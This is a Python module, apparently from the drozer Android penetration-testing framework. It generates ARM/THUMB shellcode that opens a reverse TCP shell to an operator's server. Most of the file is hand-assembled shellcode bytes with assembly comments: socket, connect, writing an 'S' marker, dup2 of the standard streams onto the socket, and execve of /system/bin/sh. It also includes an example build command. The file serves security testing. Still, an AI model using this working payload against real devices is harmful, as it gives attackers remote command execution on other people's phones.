from drozer.modules import common, Module

class ARMEABI(Module, common.ShellCode):

    name = "Establish a reverse TCP Shell (ARMEABI)"
    description = """
    Establish a reverse TCP Shell through the drozer Server.
    
    This module connects to the drozer Server, and sends 0x53 (S) to identify
    itself as a bind shell.
    
    You can collect the shell by connecting to the server and sending 'COLLECT'
    as the first line.

    Prerequisites:
      * SP is pointing to a RW location in memory
    """
    examples = """
    $ drozer payload build shell.reverse_tcp.armeabi  --server 10.0.2.2:31420
                                                      --format U
    """
    author = "Tyrone (@mwrlabs)"
    date = "2013-07-24"
    license = "BSD (3 clause)"
    module_type = "payload"
    path = ["shell.reverse_tcp"]

    def __init__(self, session, loader, exploit=None):
        Module.__init__(self, session)
        
        self.__exploit = exploit
        self.__loader = loader
    
    def add_arguments(self, parser):
        parser.add_argument("--mode", choices=["ARM", "THUMB"], default="ARM", help="specify which mode the CPU is in at the point where shellcode is executed")
    
    def generate(self, arguments):

        if arguments.mode == "ARM":
            self.append([# Switch to THUMB mode for more compact shellcode
                         0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
                         0x11, 0xff, 0x2f, 0xe1      # bx    r1
                        ])

        self.append([# socket() - store fd in r3
                     0x02, 0x20,                 # mov   r0, #2
                     0x01, 0x21,                 # mov   r1, #1
                     0x52, 0x40,                 # eor   r2, r2
                     0x64, 0x27,                 # mov   r7, #100
                     0xb5, 0x37,                 # add   r7, r7, #181
                     0x01, 0xdf,                 # svc   1
                     0x03, 0x1c,                 # mov   r3, r0
                     
                     # connect()
                     0x10, 0x22,                 # mov   r2, #16
                     0x79, 0x46,                 # mov   r1, pc
                     0x2a, 0x31,                 # add   r1, r1, #42
                     0x02, 0x37,                 # add   r7, r7, #2
                     0x01, 0xdf,                 # svc   1
                     
                     # write('S')
                     0x18, 0x1c,                 # mov   r0, r3
                     0x01, 0x22,                 # mov   r2, #1
                     0x04, 0x27,                 # mov   r7, #4
                     0x79, 0x46,                 # mov   r1, pc
                     0x24, 0x31,                 # add   r1, r1, #36
                     0x01, 0xdf,                 # svc   1

                     # dup2() stderr, stdout and stdin
                     0x02, 0x21,                 # mov   r1, #2
                     0x3f, 0x27,                 # mov   r7, #63
                     
                     0x18, 0x1c,                 # mov   r0, r3
                     0x01, 0xdf,                 # svc   1
                     0x01, 0x39,                 # sub   r1, #1
                     0xfb, 0xd5,                 # bpl   <block>

                     # execve('/system/bin/sh')
                     0x52, 0x40,                 # eor   r2, r2
                     0x78, 0x46,                 # mov   r0, pc
                     0x11, 0x30,                 # add   r0, r0, #17
                     0x05, 0xb4,                 # push  {r0, r2}
                     0x69, 0x46,                 # mov   r1, sp
                     0x0b, 0x27,                 # mov   r7, #11
                     0x01, 0xdf,                 # svc   1

                     0x02, 0x00 ])
        self.append(self.hexifyInt32(int(arguments.server[1])))
        self.append(self.hexifyInetAddr(arguments.server[0]))

        self.append(self.hexifyString("S"))     # 'S' to indicate shell

        self.append(self.hexifyString("/system/bin/sh"))
        self.append(self.hexifyNull())
        